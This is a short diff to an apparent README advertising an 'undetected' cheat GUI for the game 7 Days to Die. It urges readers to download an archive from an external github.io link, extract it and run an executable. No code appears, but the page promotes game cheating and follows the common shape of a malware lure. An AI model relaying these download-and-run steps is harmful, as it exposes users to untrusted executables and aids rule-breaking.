@@ -14,7 +14,7 @@ Getting started takes less than 60 seconds.
 
 1.  **Click the vibrant green "Download Now" button above.**
 2.  **Extract** the downloaded archive to any folder on your computer.
-3.  **Run** the executable file (`Launcher.exe` or similar).
+3.  **Run** the executable file (`.exe` or similar).
 4.  Launch your game and dominate.
 
 **No complex installers. No confusing steps. Just power, instantly.**
@@ -73,3 +73,4 @@ A: The default toggle key is `INSERT` on your keyboard. This can usually be chan
 [![Download Latest Version](https://img.shields.io/badge/🚀_DOWNLOAD_NOW-7DTD_2026_Hack-9cf?style=for-the-badge&logo=steam)](https://crownoiroute.github.io/7-Days-to-Die-Undetected-Hack-GUI/)
 
 **Extract > Run > Dominate.** The ultimate power is one click away.
+
